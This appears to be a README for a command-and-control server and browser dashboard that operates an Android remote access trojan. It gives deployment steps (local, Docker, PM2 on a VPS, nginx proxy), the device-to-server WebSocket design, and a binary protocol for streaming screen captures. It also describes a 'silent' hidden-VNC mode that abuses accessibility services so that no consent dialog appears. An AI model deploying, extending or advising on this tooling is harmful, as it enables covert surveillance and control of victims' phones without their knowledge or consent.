# RAT C2 Dashboard

Professional command-and-control dashboard for the Android RAT agent.

## Architecture

```
APK (device)  ──ws:// /ws──►  Node.js server  ◄──ws:// /panel──  Browser dashboard
                               └── Express HTTP   ◄── /  (frontend)
```

- **Binary frames** from APK forwarded zero-copy to watching dashboards  
- **JSON commands** from dashboard forwarded instantly to target device  
- **Heartbeat** every 25s detects dead connections without waiting for TCP timeout  
- **Exponential backoff** reconnect on the dashboard (1s → 30s cap)  

---

## Quick Start — Local

```bash
npm install
node server.js
# open http://localhost:5000
```

APK connects to: `ws://YOUR_IP:5000/ws`  
Dashboard:       `http://YOUR_IP:5000`

---

## Quick Start — Docker

```bash
docker compose up -d
```

---

## VPS Deployment (PM2)

```bash
git clone <repo> /opt/rat-dashboard && cd /opt/rat-dashboard
npm install --production
npm install -g pm2
pm2 start server.js --name rat-dashboard --max-memory-restart 512M
pm2 save && pm2 startup
```

### Nginx reverse proxy

```nginx
server {
    listen 80;
    server_name your.domain.com;
    location / {
        proxy_pass         http://127.0.0.1:5000;
        proxy_http_version 1.1;
        proxy_set_header   Upgrade    $http_upgrade;
        proxy_set_header   Connection "upgrade";
        proxy_set_header   Host       $host;
        proxy_read_timeout 86400s;
    }
}
```

---

## GitHub Secrets Required

| Secret | Description |
|---|---|
| `VPS_HOST` | VPS IP or hostname |
| `VPS_USER` | SSH username |
| `SSH_PRIVATE_KEY` | SSH private key |
| `VPS_PORT` | SSH port (default 22) |

## Environment Variables

| Variable | Default | Description |
|---|---|---|
| `PORT` | `5000` | Listening port |
| `HOST` | `0.0.0.0` | Bind address |
| `PING_INTERVAL` | `25000` | Heartbeat interval ms |

---

## HVNC Reader Modes

| Mode | Command | Notes |
|---|---|---|
| **V1** | `START_VNC` | Standard capture |
| **V2** | `START_SILENT_VNC` | Accessibility — no consent dialog |

Toggle instantly with the **V1 / V2** button on the Screen panel.

## Binary Frame Protocol (APK → Server)

```
[0x01][4-byte big-endian len][JPEG bytes]
```

Forwarded as raw Buffer to dashboards — zero re-encoding.
